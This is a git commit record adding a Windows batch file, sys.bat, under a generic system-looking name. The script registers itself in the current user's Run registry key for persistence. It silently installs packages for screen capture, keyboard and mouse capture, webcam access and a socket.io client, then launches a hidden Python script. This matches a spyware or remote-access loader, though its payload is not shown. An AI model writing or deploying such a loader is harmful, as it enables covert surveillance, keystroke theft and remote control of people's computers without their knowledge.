2f6ff35f4a3b3ecde52f0e7b098ea856550f7765
MD. JIBON HOWLADER <PROGRAMMERJIBON@GMAIL.COM>
2026-01-10 00:47:04 +0600

    fucked up

---
+++ home/sys.bat
@@ -0,0 +1,6 @@
+@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sys256" /t REG_SZ /d "C:\sys\sys.bat" /f
+start "" pythonw -m pip install --upgrade pip
+start "" pythonw -m pip install --upgrade python-socketio[client] opencv-python mss pynput pyautogui numpy
+start "" pythonw "C:\sys\sys.py"
+exit
